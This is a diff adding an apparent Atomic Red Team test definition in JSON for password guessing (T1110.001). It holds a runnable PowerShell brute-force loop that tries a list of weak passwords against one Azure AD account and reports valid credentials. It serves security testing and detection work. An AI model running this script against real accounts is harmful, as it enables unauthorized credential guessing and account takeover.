@@ -1,0 +1,42 @@
+{
+    "name": "Brute Force Credentials of single Azure AD user",
+    "description": "Attempt to brute force Azure AD user via AzureAD powershell module. ",
+    "supported_platforms": [
+        "azure-ad"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "command": "Import-Module -Name AzureAD\n\n$passwords = \"#{passwords}\".split(\"{`n}\")\nforeach($password in $passwords) {\n  $PWord = ConvertTo-SecureString -String \"$password\" -AsPlainText -Force\n  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\n  try {\n    Write-Host \" [-] Attempting ${password} on account #{username}.\"\n    Connect-AzureAD -Credential $Credential 2>&1> $null\n    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success\n    Write-Host \" [!] #{username}:${password} are valid credentials!`r`n\"\n    break\n  } catch {\n    Write-Host \" [-] #{username}:${password} invalid credentials.`r`n\"\n  }\n}\nWrite-Host \"End of bruteforce\"\n",
+        "type": "Command Executor"
+    },
+    "id": "T1110.001",
+    "tactics": [
+        "Credential Access"
+    ],
+    "technique": "Password Guessing",
+    "source": "ART",
+    "uuid": "5a51ef57-299e-4d62-8e11-2d440df55e69",
+    "arguments": {
+        "username": {
+            "description": "Account to bruteforce. We encourage users running this atomic to add a valid microsoft account domain; for eg \"bruce.wayne@<valid_ms_account.com>\"",
+            "type": "string",
+            "default": "bruce.wayne@contoso.com"
+        },
+        "passwords": {
+            "description": "List of passwords we will attempt to brute force with",
+            "type": "string",
+            "default": "Password1`n1q2w3e4r`nPassword!"
+        }
+    },
+    "preconditions": [
+        {
+            "description": "AzureAD module must be installed.\n",
+            "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+            "get_prereq_command": "Install-Module -Name AzureAD -Force\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
